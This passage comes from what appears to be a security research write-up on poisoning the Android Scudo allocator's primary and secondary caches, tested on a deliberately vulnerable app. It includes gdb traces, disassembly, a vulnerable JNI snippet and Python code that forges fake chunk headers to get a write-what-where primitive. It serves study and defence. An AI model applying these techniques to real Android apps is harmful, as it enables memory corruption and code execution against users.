combined_header.bytes() + p64(0) + b'Hello World! and set a breakpoint right before the call to free(buffer + 0x10), we get:\n... gef➤ i r rdi rdi 0x7bac7976f740 0x7bac7976f740 gef➤ x/4gx $rdi-0x10 0x7bac7976f730:\t0x75a5000000000101\t0x0000000000000000 0x7bac7976f740:\t0x6f57206f6c6c6548\t0x0000000021646c72 ... Notice that the leaked pointer is 0x7bac7976f730! So this looks promising! Stepping over free will either tell us that we messed up by aborting, or will work and thus our fake chunk is in the primary.\nIt seems to have worked! The next call is to malloc(0x10) (see that the actual chunk size will be 0x20, if malloc(0x10) is called, because header and padding are also stored). As combined_header.ClassId = 1, the chunk that we freed is part of the chunk array that is used to serve malloc(0x10) calls! Executing malloc(0x10) yields:\ngef➤ i r edi edi 0x10 0x10 gef➤ ni ... gef➤ i r rax rax 0x7bac7976f740 0x7bac7976f740 gef➤ x/s $rax 0x7bac7976f740:\t\u0026#34;Hello World!\u0026#34; Remember that we called free(buffer + 0x10) = free(0x7bac7976f730 + 0x10) = free(0x7bac7976f740)!\nTherefore, not only did we move a chunk of size 0x30 (includes header size 0x10; remember that buffer = malloc(BUFFER_SIZE = 0x20)) to the chunk array that contains chunks of size only 0x20. But we also served a \u0026ldquo;preinitialized\u0026rdquo; chunk. Notice that we basically performed two different things at the same time:\nServed an arbitrary chunk (we will soon see that this cannot be that arbitrary\u0026hellip;) Preinitialized data. This is actually unexpected, but a nice feature :) Basically, this allows us to infer that Options.getFillContentsMode() = NoFill , which comes from setting the flags where zero_contents = false and pattern_fill_contents = false ! This will result in a check that determines what to do with the contents to evaluate to false. Pitfalls and Challenges The above primary poisoning seems to work perfectly, but I have not told you what assumptions lie in the dark\u0026hellip;\nLets try to come up with a list of assumptions and constraints (ignoring the base assumption of availability of sufficient leaks and \u0026ldquo;classical\u0026rdquo; ones like that chunk addresses have to be aligned).\nThievish Threads As multiple threads share the same allocator (even the same TSD, which contains a cache that represents the primary), another thread could snack our fake chunk just introduced into the primary. Therefore, primary poisoning is probabilistic!\nMoreover the thread that runs the JNI function could be assigned another TSD , because the old one is overloaded, i.e. there are lots of threads using the same TSD. Again, we would never see our chunk again.\nIt looks like every thread could be assigned every TSD after sufficient execution time (further analysis is needed to fully prove this). This might be beneficial in some cases where we want to attack code that is running in another thread.\nMulti - Threaded Chunk Liberation The chunk array might be drained , because the amount of free chunks, represented by C-\u0026gt;Count , exceeds an upper bound. E.g. C-\u0026gt;MaxCount = 13 for class id 1, because we can distinguish the following cases for C-\u0026gt;Count:\nC-\u0026gt;Count = C-\u0026gt;MaxCount / 2 . This stems from the fact that deallocate can create batches if the corresponding Chunks array is full. To be precise, this will trigger the execution of drain , where C-\u0026gt;Count = C-\u0026gt;MaxCount. Therefore the minimum Count = Min(C-\u0026gt;MaxCount / 2, C-\u0026gt;Count) in drain will evaluate to 0 \u0026lt; C-\u0026gt;MaxCount / 2 \u0026lt; C-\u0026gt;MaxCount. Finally, C-\u0026gt;Count -= Count \u0026lt;=\u0026gt; C-\u0026gt;Count = C-\u0026gt;MaxCount - C-\u0026gt;MaxCount / 2 = C-\u0026gt;MaxCount / 2. Notice that C-\u0026gt;MaxCount = 2 * TransferBatch::getMaxCached(Size) . As can be seen in the next step, for malloc(0x10), this will result in C-\u0026gt;MaxCount = 2 * 13 = 26 =\u0026gt; C-\u0026gt;Count = 26 / 2 = 13. C-\u0026gt;Count = MaxCount , i.e.: C-\u0026gt;Count = MaxCount = TransferBatch::getMaxCached(Size) = Min(MaxNumCached, SizeClassMap::getMaxCachedHint(Size)) = Min(13, Max(1U, Min(Config::MaxNumCachedHint, N))) = Min(13, Max(1U, Min(13, (1U \u0026lt;\u0026lt; Config::MaxBytesCachedLog) / static_cast\u0026lt;u32\u0026gt;(Size)))) = Min(13, Max(1U, Min(13, (1U \u0026lt;\u0026lt; 13) / Classes[ClassId - 1]))) where Classes : static constexpr u32 Classes[] = { 0x00020, 0x00030, 0x00040, 0x00050, 0x00060, 0x00070, 0x00080, 0x00090, 0x000a0, 0x000b0, 0x000c0, 0x000e0, 0x000f0, 0x00110, 0x00120, 0x00130, 0x00150, 0x00160, 0x00170, 0x00190, 0x001d0, 0x00210, 0x00240, 0x002a0, 0x00330, 0x00370, 0x003a0, 0x00400, 0x00430, 0x004a0, 0x00530, 0x00610, 0x00730, 0x00840, 0x00910, 0x009c0, 0x00a60, 0x00b10, 0x00ca0, 0x00e00, 0x00fb0, 0x01030, 0x01130, 0x011f0, 0x01490, 0x01650, 0x01930, 0x02010, 0x02190, 0x02490, 0x02850, 0x02d50, 0x03010, 0x03210, 0x03c90, 0x04090, 0x04510, 0x04810, 0x05c10, 0x06f10, 0x07310, 0x08010, 0x0c010, 0x10010, }; So for a small allocation, i.e. for ClassId = 1, we get:\nC-\u0026gt;MaxCount = Min(13, Max(1U, Min(13, 0x2000 / 0x20))) = Min(13, Max(1U, Min(13, 256))) = Min(13, Max(1U, 13)) = 13 Lets say we have C-\u0026gt;Count = 13 and we introduce our fake chunk. Then, on execution of deallocate , we get that C-\u0026gt;Count = C-\u0026gt;MaxCount and therefore drain is called. By itself, this would not be an issue, because drain will only remove the oldest half of the chunks and move the other chunks to the front of the array. But what happens, if there is another thread that wants to free memory? Assuming that the thread performs C-\u0026gt;MaxCount / 2 + 1 calls to deallocate, this will trigger drain again and therefore result in our chunk being pushed back onto a free list.\nFake Chunk Mispositioning The fake chunk may be \u0026ldquo;at the wrong location\u0026rdquo;. To that end, notice that compacting a pointer is done as follows:\nCompactPtrT compactPtr(uptr ClassId, uptr Ptr) { DCHECK_LE(ClassId, SizeClassMap::LargestClassId); return compactPtrInternal(getCompactPtrBaseByClassId(ClassId), Ptr); } ... uptr getCompactPtrBaseByClassId(uptr ClassId) { // If we are not compacting pointers, base everything off of 0. if (sizeof(CompactPtrT) == sizeof(uptr) \u0026amp;\u0026amp; CompactPtrScale == 0) return 0; return getRegionInfo(ClassId)-\u0026gt;RegionBeg; } ... static CompactPtrT compactPtrInternal(uptr Base, uptr Ptr) { return static_cast\u0026lt;CompactPtrT\u0026gt;((Ptr - Base) \u0026gt;\u0026gt; CompactPtrScale); } Basically, a pointer is compacted by subtracting the base address of the region that belongs to a specific class id (e.g. 1) from that pointer and right - shifting the resulting relative offset by some value (often 4 , which makes sense in terms of alignment).\nWhen supplying an address from a different segment to free(addr + 0x10), we have to ensure that this address is bigger than the base address of the class the fake chunk \u0026ldquo;belongs\u0026rdquo; to. E.g. if we put a fake chunk on the stack, i.e. at 0x7babf2c25890 with a header of 0x2542000000000101, but the base of the region holding class id 1 chunks is 0x7bac69744000, then:\nsub 0x7babf2c25890, 0x7bac69744000 = 0xfffffffff894e189 -\u0026gt; underflow Notice that it is (most likely) an invariant that the base is always smaller than or equal to the address of the chunk to be freed. Therefore, this could be undefined behaviour! The bits 4 to 35 (inclusive) of 0xfffffffff894e189, i.e. 0xff894e18, will be stored in the Chunks array via (r15 = ptr to store):\n... 0x00007baef7fc106b \u0026lt;+523\u0026gt;:\tsub r15,QWORD PTR [rdx+rsi*1+0x60] # subtraction from above 0x00007baef7fc1070 \u0026lt;+528\u0026gt;:\tshr r15,0x4 0x00007baef7fc1074 \u0026lt;+532\u0026gt;:\tlea edx,[rax+0x1] 0x00007baef7fc1077 \u0026lt;+535\u0026gt;:\tmov DWORD PTR [r14],edx 0x00007baef7fc107a \u0026lt;+538\u0026gt;:\tmov eax,eax 0x00007baef7fc107c \u0026lt;+540\u0026gt;:\tmov DWORD PTR [r14+rax*4+0x10],r15d ... When malloc is called, then the following is executed (r14d = compacted pointer):\n... 0x00007baef7fbcba5 \u0026lt;+389\u0026gt;:\tmov r14d,DWORD PTR [rbx+rax*4+0x10] # r14d = compacted pointer 0x00007baef7fbcbaa \u0026lt;+394\u0026gt;:\tadd QWORD PTR [r15+0xf88],rcx # stats 0x00007baef7fbcbb1 \u0026lt;+401\u0026gt;:\tsub QWORD PTR [r15+0xf90],rcx # stats 0x00007baef7fbcbb8 \u0026lt;+408\u0026gt;:\tmov rax,QWORD PTR [r15+0xfa0] 0x00007baef7fbcbbf \u0026lt;+415\u0026gt;:\tlea rcx,[r12+r12*2] 0x00007baef7fbcbc3 \u0026lt;+419\u0026gt;:\tshl rcx,0x6 0x00007baef7fbcbc7 \u0026lt;+423\u0026gt;:\tshl r14,0x4 0x00007baef7fbcbcb \u0026lt;+427\u0026gt;:\tadd r14,QWORD PTR [rax+rcx*1+0x60] ... Essentially, malloc gets rid of the sign that we would get from free if it was not for unsigned subtraction, i.e. from subtracting something big from something small. Then this value is interpreted as an unsigned integer and added to the base address of the chunk id. The following calculations might clarify that:\ngef➤ p/x 0x7bac69744000 + 0xf86d04890 = base address + shifted compacted pointer $16 = 0x7bbbf0448890 = invalid address (reality) gef➤ p/x 0x7bac69744000 + (int)0xf86d04890 = signed addition! $17 = 0x7babf0448890 = wanted address (stack) malloc will return the (above malformed) chunk.\nIf the \u0026ldquo;malformation\u0026rdquo; is controllable, then this:\ncan enable memory testing/probing? Not sure how to avoid SIGSEG though\u0026hellip; can make arbitrary (accessible) memory regions available to an attacker, if the attacker has information about the process image\u0026hellip; With the above observations, we can infer that the least - significant 36 bits of an address that is supplied to free, with the property that this address is less than or equal to the base address of the region containing chunks with id 1, determine the value that is added to the base address. To be precise, only bits 4-35 (excluding bits 0, 1, 2, 3 and everything above 35) are relevant for the addition due to the right and left shifts. As in malloc the compacted pointer is shifted to the left by 4 and this shift operation is performed in a 64-bit register, this will result in the addend to be a multiple of 0x10, which matches the default alignment.\nLong story short, if we provided a fake chunk to free with an address that is less than the base address of the region that belongs to the respective class id, then the next malloc will cause a segmentation fault with high probability.\nSecondary Cache Poisoning It is also possible to introduce fake chunks into the secondary. To that end, we have to assume that the secondary is using a cache. Lets see some already familiar code to clarify that:\nif (LIKELY(ClassId)) { ... TSD-\u0026gt;Cache.deallocate(ClassId, BlockBegin); // \u0026lt;-- primary free ... } else { ... Secondary.deallocate(Options, BlockBegin); // \u0026lt;-- secondary free } ... As we are interested in the secondary, we can focus on the implementation of Secondary::deallocate :\ntemplate \u0026lt;typename Config\u0026gt; void MapAllocator\u0026lt;Config\u0026gt;::deallocate(Options Options, void *Ptr) { LargeBlock::Header *H = LargeBlock::getHeader\u0026lt;Config\u0026gt;(Ptr); const uptr CommitSize = H-\u0026gt;CommitSize; { ScopedLock L(Mutex); InUseBlocks.remove(H); // doubly linked list remove (??unlink??); can abort FreedBytes += CommitSize; NumberOfFrees++; Stats.sub(StatAllocated, CommitSize); Stats.sub(StatMapped, H-\u0026gt;MapSize); } Cache.store(Options, H); // caching or munmap, if enabled; otherwise just munmap } First of all, InUseBlocks is a doubly linked list , which contains all allocated secondary chunks. Also, some cache object is used to \u0026ldquo;free\u0026rdquo; the chunk. Taking an attacker\u0026rsquo;s perspective, we assume that we can control the entire LargeBlock::Header :\nPrev and Next pointers that make the header a part of a doubly linked list. CommitBase. Actual starting point of the chunk. Most of the time CommitBase = MapBase + PageSize. CommitSize. Actual chunk size to be used. Most of the time CommitSize = 2 * PageSize + RequestedSize. MapBase. Used for munmap. What is really returned by mmap. MapSize. Used for munmap. What is really used when using mmap to allocate memory. Data. Actually sizeof (Data) = 0, so we can ignore this! Now we can start to tamper around with some, if not all, of those fields.\nExcursion to remove Anyone, who is familiar with the unlink exploit , might now scream to investigate DoublyLinkedList::remove . As we have to pass through this method anyways, we can do a quick analysis:\n// The consistency of the adjacent links is aggressively checked in order to // catch potential corruption attempts, that could yield a mirrored // write-{4,8} primitive. nullptr checks are deemed less vital. \u0026lt;-- I think they know already :( void remove(T *X) { T *Prev = X-\u0026gt;Prev; T *Next = X-\u0026gt;Next; if (Prev) { CHECK_EQ(Prev-\u0026gt;Next, X); Prev-\u0026gt;Next = Next; } if (Next) { CHECK_EQ(Next-\u0026gt;Prev, X); Next-\u0026gt;Prev = Prev; } if (First == X) { DCHECK_EQ(Prev, nullptr); First = Next; } else { DCHECK_NE(Prev, nullptr); } if (Last == X) { DCHECK_EQ(Next, nullptr); Last = Prev; } else { DCHECK_NE(Next, nullptr); } Size--; } Lets formulate two questions of interest:\nHow can we abuse LargeBlock::Header::Next and LargeBlock::Header::Prev to get a Write - What - Where condition? How do we pass through this method without triggering an abort, i.e. without failing any of the assertions like CHECK_EQ(Prev-\u0026gt;Next, X)? Starting off easy, we can see that choosing X-\u0026gt;Next = X-\u0026gt;Prev = 0 will cause execution of DCHECK_NE(Prev, nullptr) and DCHECK_NE(Next, nullptr). Observe that X, i.e. our fake large header is not part of the list. Therefore First != X and Last != X!\nSetting X-\u0026gt;Next = buffer and X-\u0026gt;Prev = 0 results in a call to CHECK_EQ(Next-\u0026gt;Prev, X). Thus, our buffer has to contain a pointer that points back to X, which seems pretty unlikely, but still possible. Still, as First != X and X-\u0026gt;Prev = 0 we abort due to DCHECK_NE(Prev, nullptr).\nFinally, X-\u0026gt;Next = buffer_0 and X-\u0026gt;Prev = buffer_1 enforces buffer_0 and buffer_1 to contain pointers that point back to X.\nA trivial way of passing this function is to choose X-\u0026gt;Next = X-\u0026gt;Prev = X. This ensures that X-\u0026gt;Next and X-\u0026gt;Prev always point back to X with non - zero pointers. Notice that this requires that we know the address of X! If this is the case, then DoublyLinkedList::remove behaves almost like a nop, with the side effect that Size -= 1 per call. (see future work for more)\nAlso notice that Prev-\u0026gt;Next and Next-\u0026gt;Prev will only be overwritten, if they point back to X. As X is most likely not part of the InUseBlocks list, this implies that we can already write to those locations or we can only write to locations that point back to our buffer. Thus, a Write - What - Where condition seems impossible on first analysis.\nIntroducing Fake Chunks to Secondary The AndroidConfig defines the SecondaryCache to be of type MapAllocatorCache . Therefore, there is another caching layer to be bypassed / abused.\nIf Cache.store cannot cache the chunk that is currently freed, then the chunk will just be unmapped using munmap.\nIf we passed the canCache check, it should be possible to craft fake chunks for the secondary as well, because of the caching mechanism. To that end, assuming that canCache(H-\u0026gt;CommitSize) == true, we end up in the following code\n... if (Config::SecondaryCacheQuarantineSize \u0026amp;\u0026amp; useMemoryTagging\u0026lt;Config\u0026gt;(Options)) { QuarantinePos = (QuarantinePos + 1) % Max(Config::SecondaryCacheQuarantineSize, 1u); [1] if (!Quarantine[QuarantinePos].CommitBase) { Quarantine[QuarantinePos] = Entry; return; } [2] CachedBlock PrevEntry = Quarantine[QuarantinePos]; Quarantine[QuarantinePos] = Entry; if (OldestTime == 0) OldestTime = Entry.Time; Entry = PrevEntry; } if (EntriesCount \u0026gt;= MaxCount) { if (IsFullEvents++ == 4U) EmptyCache = true; } else { [3] for (u32 I = 0; I \u0026lt; MaxCount; I++) { if (Entries[I].CommitBase) continue; if (I != 0) Entries[I] = Entries[0]; Entries[0] = Entry; EntriesCount++; if (OldestTime == 0) OldestTime = Entry.Time; EntryCached = true; break; } } ... Thus there are three interesting paths of execution:\nNo quarantine, i.e. we only run [3], which results in our chunks being placed in the cache! Non - full Quarantine, i.e. we run [1]. This will place our entry in the quarantine, but not in the cache! Eventually, the chunk will be cached, but it requires a full cycle of QuarantinePos for that to happen in this function (maybe there is another function that also increments QuarantinePos). Full Quarantine, i.e. we run [2]. Therefore, if the quarantine is filled with entries, this function will fetch the next entry from the quarantine, put our chunk into the quarantine and cache the fetched entry. A trivial attack for that is to fill the quarantine by calling scudo_free on a crafted large chunk that passes all the checks. Then, after at most Max(Config::SecondaryCacheQuarantineSize, 1u) + 1 many calls we are guaranteed to have our chunk cached. Afterwards, when calling MapAllocator::allocate , this will result in Cache::retrieve returning the first non - null cache entry, which is, with high probability (ignoring multi-threaded access), our fake chunk. This is similar to crafting a fake chunk with the primary , although we should not be limited by decompacting a pointer .\nIt does not seem like there is memory tagging enabled on my system. Therefore, there is no need to bypass the quarantine with the above attack\u0026hellip;the fake chunk can be added to the cache directly.\nLets try to craft a fake chunk for the secondary. To that end, lets assume we have the following setup:\n#define BUFFER_SIZE 0x100 uint8_t buffer[BUFFER_SIZE] = { 0 }; if (!called) { called++; jbyteArray ar = (*env)-\u0026gt;NewByteArray(env, 8); jbyte *leak = (jbyte*)\u0026amp;buffer; (*env)-\u0026gt;SetByteArrayRegion(env, ar, 0, 8, \u0026amp;leak); return ar; } uint8_t *raw = (uint8_t*)(*env)-\u0026gt;GetByteArrayElements(env, chunk, NULL); uint32_t length = (*env)-\u0026gt;GetArrayLength(env, chunk); if (raw) { memcpy(buffer, raw, (length \u0026lt;= BUFFER_SIZE) ? length : BUFFER_SIZE); // Brings attacker - controlled chunk into secondary cache free(buffer + 0x30 + 0x10); // large header + combined header // Triggers potential write - what - where condition. This could also be triggered by another // thread, although it might be problematic what that thread will write and how much... uint8_t *write_trigger = malloc(length - 0x40); memcpy(write_trigger, raw + 0x40, length - 0x40); free(write_trigger); } return NULL; On first execution of the above code snippet, the address of buffer = 0x7babf29407b0 will be leaked. For any other execution, we will try to call free(buffer + 0x30 + 0x10) and malloc(length - 0x40). Notice that length will be the length of the whole chunk including the headers. When calling malloc we have to provide the size of the user data that does not include the headers!\nSetting a breakpoint right before free yields:\ngef➤ i r rdi rdi 0x7babf29407f0 0x7babf29407f0 gef➤ x/8gx $rdi-0x40 0x7babf29407b0:\t0x00007babf29407b0\t0x00007babf29407b0 \u0026lt;-- 0x7babf29407c0:\t0x00007babf29407f0\t0x0000000000080040 |-- large header 0x7babf29407d0:\t0xffffffffffffffff\t0xffffffffffffffff \u0026lt;-- 0x7babf29407e0:\t0xd82d000000000100\t0x0000000000000000 \u0026lt;-- combined header + 8 bytes padding Again, if we pass all the checks, i.e. provided a correct large chunk, then the app will not abort and not cause a segfault. Also observe that the LargeBlock::Header::Prev and LargeBlock::Header::Next both point to the beginning of LargeBlock::Header. This is because the header has to pass InUseChunks.remove(H).\nThe header could be crafted in the following way:\n# Craft large header lhdr = large_header() lhdr.Prev = pointer # ensure that DoublyLinkedList::remove is nop lhdr.Next = pointer lhdr.CommitBase = pointer + 0x30 + 0x10 # pointer to user data lhdr.CommitSize = 0x400 * 0x200 + 0x40 # data + headers lhdr.MapBase = 0xffffffffffffffff # irrelevant; for debugging reasons set to -1 lhdr.MapSize = 0xffffffffffffffff # irrelevant; for debugging reasons set to -1 # Combined header combined_header = unpacked_header() combined_header.ClassId = 0 # Secondary allocations have class id 0 combined_header.State = 1 # = allocated combined_header.SizeOrUnusedBytes = 0 # irrelevant combined_header.OriginOrWasZeroed = 0 # = malloc\u0026#39;ed chunk combined_header.Offset = 0 # irrelevant (for now) combined_header.Checksum = utils.android_crc32( cookie, pointer + 0x30 + 0x10, # user data pointer: sizeof (LargeBlock::Header) = 0x30, sizeof (Chunk::UnpackedHeader) = 0x8, 8 bytes padding -\u0026gt; 0x40 combined_header.pack() ) # Send chunk data = b\u0026#39;\\x42\u0026#39; * 0x400 * 0x200 # 512KiB to trigger secondary allocation io.forward(lhdr.bytes() + combined_header.bytes() + p64(0) + data) Notice that canCache imposes an upper bound on LargeBlock::Header::CommitSize, which is 2 \u0026lt;\u0026lt; 20 . Observe that there is no lower bound to LargeBlock::Header::CommitSize that restricts us from introducing a fake chunk into the cache (see later for more on a lower bound)! (see future work for an attack idea that abuses the fact that malloc calls do not have any control over the size field. This implies that allocations that are in size range of the primary will be taken from the primary. Setting fake.CommitSize \u0026lt;= \u0026lt;max primary allocation size\u0026gt; will result in a dead cache entry, because it will be smaller than any requested size allocated by the secondary assuming that the primary did not fail to allocate)\nRight before calling malloc(buffer + 0x40) we have:\ngef➤ i r rdi rdi 0x80000 0x80000 gef➤ ni ... gef➤ i r rax rax 0x7babf2940830 0x7babf2940830 gef➤ x/8gx $rax-0x40 0x7babf29407f0:\t0x00007bac40c76fc0\t0x0000000000000000 0x7babf2940800:\t0x00007babf29407f0\t0x0000000000080040 0x7babf2940810:\t0xffffffffffffffff\t0xffffffffffffffff 0x7babf2940820:\t0x216a000000000100\t0x4242424242424242 As can be seen from the fields LargeBlock::Header::MapBase = -1 and LargeBlock::Header::MapSize = -1, we definitely get our chunk back. There cannot be any other chunk with such a chunk header, because this would imply that mmap returned -1, which is not a valid user - space address on Android. Also observe that the last cached large chunk is retrieved first . Hence, if we called malloc next, then our fake chunk would be considered first!\nStill, there is something off:\nLargeBlock::Header::Prev = 0x00007bac40c76fc0, which is not our chunk. LargeBlock::Header::Next = 0x0000000000000000, so its the last element in InUseChunks LargeBlock::Header::CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40, where 0x7babf29407b0 was the address of the large header before calling free. But we can see that the CommitBase remained the same and also that the newly \u0026ldquo;allocated\u0026rdquo; chunk is now located at 0x00007babf29407f0, which is the CommitBase value of our fake chunk (technically, this could be a coincidence, because 0x7babf29407f0 = 0x7babf29407b0 + 0x40, which is just shifted by the size of all header altogether including padding. The argument against that is that the secondary by itself should have no reason to return a chunk that is located on the stack, i.e. overlapping with our buffer). As is the case with primary poisoning , the contents have not been cleared:\ngef➤ x/4gx $rax 0x7babf2940830:\t0x4242424242424242\t0x4242424242424242 0x7babf2940840:\t0x4242424242424242\t0x4242424242424242 which again allows for distinguishing fake chunk creation and preinitialization of memory. When attempting to preinitialize a data structure, we have to take the shift of 0x40 into account (we will see why the shift is there later).\nChallenges Similar to primary poisoning , there are some pitfalls with secondary cache poisoning , which will be discussed in this section.\nOne Secondary to rule \u0026rsquo;em all Observe that when allocating memory from the secondary via malloc(\u0026lt;large size\u0026gt;) , there is only one instance of the secondary that actually handles these allocations (as opposed to the primary, which may \u0026ldquo;change\u0026rdquo; depending on the outcome of getTSDAndLock . Actually the primary itself does not change, but the cache that is based on the primary. I will use primary and a cache that comes from the primary interchangably, because the Primary is not used for any allocations directly).\nConsidering the empirical observation that the damnvulnerableapp:VulnerableActivity averages to roughly 20 threads per run, it is very likely that other threads will also use the secondary. One particular run shows 25 threads running in parallel:\ngef➤ i threads Id Target Id Frame 1 Thread 16516.16516 \u0026#34;nerableActivity\u0026#34; 0x00007baef80269aa in __epoll_pwait () from libc.so 6 Thread 16516.16521 \u0026#34;Signal Catcher\u0026#34; 0x00007baef80263ea in __rt_sigtimedwait () from libc.so 7 Thread 16516.16522 \u0026#34;perfetto_hprof_\u0026#34; 0x00007baef8025747 in read () from libc.so 8 Thread 16516.16523 \u0026#34;ADB-JDWP Connec\u0026#34; 0x00007baef8026aaa in __ppoll () from libc.so 9 Thread 16516.16524 \u0026#34;Jit thread pool\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 10 Thread 16516.16525 \u0026#34;HeapTaskDaemon\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 11 Thread 16516.16526 \u0026#34;ReferenceQueueD\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 12 Thread 16516.16527 \u0026#34;FinalizerDaemon\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 13 Thread 16516.16528 \u0026#34;FinalizerWatchd\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 14 Thread 16516.16529 \u0026#34;Binder:16516_1\u0026#34; 0x00007baef80259e7 in __ioctl () from libc.so 15 Thread 16516.16530 \u0026#34;Binder:16516_2\u0026#34; 0x00007baef80259e7 in __ioctl () from libc.so 16 Thread 16516.16533 \u0026#34;Binder:16516_3\u0026#34; 0x00007baef80259e7 in __ioctl () from libc.so 17 Thread 16516.16538 \u0026#34;Profile Saver\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 18 Thread 16516.16539 \u0026#34;RenderThread\u0026#34; 0x00007baef80269aa in __epoll_pwait () from libc.so 19 Thread 16516.16542 \u0026#34;pool-2-thread-1\u0026#34; 0x00007baef8026aaa in __ppoll () from libc.so 20 Thread 16516.16544 \u0026#34;hwuiTask0\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 21 Thread 16516.16545 \u0026#34;hwuiTask1\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 22 Thread 16516.16546 \u0026#34;Binder:16516_3\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 23 Thread 16516.16547 \u0026#34;Thread-3\u0026#34; 0x00007baef802656a in recvfrom () from libc.so * 24 Thread 16516.16548 \u0026#34;Thread-2\u0026#34; 0x00007babf33de9ec in Java_com_damnvulnerableapp_vulnerable_modules_SecondaryFakeModule_free () from libSecondaryFakeModule.so 25 Thread 16516.16562 \u0026#34;Binder:16516_4\u0026#34; 0x00007baef80259e7 in __ioctl () from libc.so As with the primary , our fake chunk may be stolen by another thread, depending on the allocations performed.\nAnother problem is that if the cache is full and there are not \u0026ldquo;enough\u0026rdquo; (4) allocations happening to balance out the congestion of the cache, the cache will be emptied . This basically invalidates all cache entries and unmaps them. Having munmap called on our fake chunk might seem problematic, but it turns out that running munmap(0x0, 0x1) returns successfully\u0026hellip;Therefore, setting LargeBlock::Header::MapBase = 0 and LargeBlock::Header::MapSize = 1 at least prevents the app from aborting. Of course, having our fake cache entry stripped from the cache mitigates this attack.\nTo conclude, Secondary Cache Poisoning is probabilistic just like Primary Poisoning !\nShifted User Data Recall that our fake chunk returned from calling malloc is located at fake.CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40. Therefore, the user data starts at 0x7babf29407b0 + 0x40 + 0x40 = 0x7babf2940830, because of the headers and padding (see example above). At best, we want to show that malloc(size) = fake.CommitBase + 0x40, because this would allow us to precisely control where the fake chunk is located. Observe that there seem to be no limitations on the position of a secondary chunk as opposed to primary chunks , because the LargeBlock::Header::CommitBase is not compacted!\nLets say we successfully called free(buffer + 0x40) and therefore introduced our fake chunk into the secondary cache. Also, assume that the next call of our thread to malloc(fake.CommitSize - 0x40) returns our fake chunk, if available in terms of size and pointer constraints (no other thread can steal it), and that 0x10 | fake.CommitBase and 0x10 | fake.CommitSize (i.e. everything is nicely aligned). We want to prove that these assumptions imply that malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40.\nFirst, observe that MapAllocatorCache::store does not change fake.CommitBase and fake.CommitSize. To that end, notice that all accesses to Entry.CommitBase and Entry.CommitSize , are by value and not by reference. Thus, the actual cache entry will contain our chosen fake.CommitBase and fake.CommitSize.\nWhen allocating from the secondary cache, retrieve is called. Based on the assumption that malloc(fake.CommitSize - 0x40) returns our fake chunk if available, we need to show that\nthe sizes match, s.t. our fake chunk is actually part of the set of chunks that fit our allocation request. Then, by assumption, the fake chunk will be returned. the CommitBase is somehow modified by a constant. For the first point, observe that Secondary.deallocate is given the allocation size that is passed to malloc. Therefore, MapAllocatorCache::retrieve is called with Size = fake.CommitSize - 0x40. We also know that fake_entry.CommitSize = fake.CommitSize (we will call the entry representing our fake chunk fake_entry). Hence CommitBase := fake_entry.CommitBase and CommitSize := fake_entry.CommitSize. Then it has to hold that\nHeaderPos \u0026gt; CommitBase + CommitSize . This is computed in the following: AllocPos = roundDownTo(CommitBase + CommitSize - Size, Alignment) = roundDownTo(CommitBase + CommitSize - (fake.CommitSize - 0x40), Alignment) = roundDownTo(CommitBase + CommitSize - (CommitSize - 0x40), Alignment) = roundDownTo(CommitBase + 0x40), Alignment) \u0026lt;-- assumption on 0x10 divides CommitBase = CommitBase + 0x40 HeaderPos = AllocPos - Chunk::getHeaderSize() - LargeBlock::getHeaderSize(); = (CommitBase + 0x40) - 0x10 - 0x30 = CommitBase Therefore, we check whether CommitBase \u0026gt; CommitBase + CommitSize \u0026lt;=\u0026gt; 0 \u0026gt; CommitSize, which is impossible, as CommitSize is of type uptr = uintptr_t . To be precise, an unsigned comparison will be performed, i.e. for r13 = AllocPos and rsi = CommitBase + CommitSize: 0x00007baef7fc0dc6 \u0026lt;+182\u0026gt;:\tadd r13,0xffffffffffffffc0 // HeaderPos = AllocPos - 0x40 0x00007baef7fc0dca \u0026lt;+186\u0026gt;:\tcmp r13,rsi // CommitBase - (CommitBase + CommitSize) = -CommitSize 0x00007baef7fc0dcd \u0026lt;+189\u0026gt;:\tja 0x7baef7fc0d80 // jump if CF=0 and ZF=0; we DONT want to jump here For the above, CF=1 as mathematically CommitSize \u0026gt;= 0. Hence, the fake chunk passes the first check. HeaderPos \u0026lt; CommitBase || AllocPos \u0026gt; CommitBase + PageSize * MaxUnusedCachePages : HeaderPos \u0026lt; CommitBase \u0026lt;=\u0026gt; CommitBase \u0026lt; CommitBase is trivially false. The second condition requires a bit more math: AllocPos = CommitBase + 0x40 \u0026gt; CommitBase + PageSize * MaxUnusedCachePages \u0026lt;=\u0026gt; 0x40 \u0026gt; 0x1000 * 4 which is trivially false. From now on we may assume that the fake chunk passed all the above tests, which implies that we reach the assignment phase . Luckily, this phase does not modify fake_entry.CommitBase and fake_entry.CommitSize at all. Notice that the pointer to the header that MapAllocatorCache::retrieve returns is HeaderPos , i.e. CommitBase.\nFinally, the user data pointer will be computed here (extremely simplified):\nreturn H + LargeBlock::getHeaderSize(); // = fake.CommitBase + 0x30 This is then used to compute the final user pointer Ptr = fake.CommitBase + 0x30 + 0x10 (again extremely simplified, but this is what actually happens when resolving alignment etc.).\nTherefore, malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40 (btw. this is totally a Write - What - Where condition ).\nNeat Little Side Effect The attentive reader might have noticed that the previous proof, dispite being a mathematical disaster, implies that an attacker can control where the chunk is returned to by setting fake.CommitBase accordingly.\nTheoretically speaking, let target_addr be the address we want to write data to. Also, we assume that the cache is not emptied. If the cache is emptied while the fake chunk is cached, munmap will either return an error, which in turn results in an abort, or will unmap a region that is in use, therefore eventually causing a segmentation fault. Thus, the probability of the following attack to succeed decreases with increasing amount of bytes to write!\nFrom malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40 we get that the LargeBlock::Header is stored at a chosen fake.CommitBase. As we cannot control the contents of fake.Prev and fake.Next, because they will be overwritten, we have to stick with fake.MapBase and fake.MapSize. It should also be possible to use the fake.CommitSize field, but we will ignore it for now, because it will be modified by a + 0x40, which has to be considered when calling free in order to 